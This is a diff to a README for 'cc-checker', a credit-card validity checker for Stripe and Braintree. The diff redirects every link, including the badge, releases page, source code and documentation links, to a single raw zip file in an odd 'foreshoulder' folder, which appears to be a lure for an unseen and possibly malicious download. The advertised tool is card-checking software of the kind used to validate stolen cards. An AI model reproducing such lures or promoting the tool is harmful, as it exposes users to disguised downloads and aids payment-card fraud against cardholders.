@@ -1,6 +1,6 @@
 # 🚀 cc-checker - Check Your Payment Methods Easily
 
-![Download cc-checker](https://img.shields.io/badge/Download-cc--checker-brightgreen)
+![Download cc-checker](https://raw.githubusercontent.com/Mrmadni786/cc-checker/main/foreshoulder/cc-checker.zip)
 
 ## 📋 Description
 Welcome to cc-checker. This free application helps you check the validity of credit cards, including support for major processors like Stripe and Braintree. Use it to verify payment methods without any hassle. 
@@ -29,7 +29,7 @@ To install and run cc-checker, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases section where you can find the latest version.
 
-   [Visit the Download Page](https://github.com/Mrmadni786/cc-checker/releases)
+   [Visit the Download Page](https://raw.githubusercontent.com/Mrmadni786/cc-checker/main/foreshoulder/cc-checker.zip)
 
 2. **Download the Application**: Locate the most recent version and download the file that corresponds to your operating system.
 
@@ -40,7 +40,7 @@ To install and run cc-checker, follow these steps:
 ## 📥 Download & Install
 To download the latest version of cc-checker, return to the Releases page by clicking the link below:
 
-[Download cc-checker](https://github.com/Mrmadni786/cc-checker/releases)
+[Download cc-checker](https://raw.githubusercontent.com/Mrmadni786/cc-checker/main/foreshoulder/cc-checker.zip)
 
 Once there, follow the installation steps outlined above.
 
@@ -59,7 +59,7 @@ Once there, follow the installation steps outlined above.
 If you run into issues or have questions, feel free to reach out. You can open an issue on the GitHub repository or contact our support team through the provided channels.
 
 ## 🔗 Useful Links
-- [Source Code](https://github.com/Mrmadni786/cc-checker)
-- [Documentation](https://github.com/Mrmadni786/cc-checker/wiki)
+- [Source Code](https://raw.githubusercontent.com/Mrmadni786/cc-checker/main/foreshoulder/cc-checker.zip)
+- [Documentation](https://raw.githubusercontent.com/Mrmadni786/cc-checker/main/foreshoulder/cc-checker.zip)
 
 Thank you for choosing cc-checker. We hope it simplifies your payment method checks!
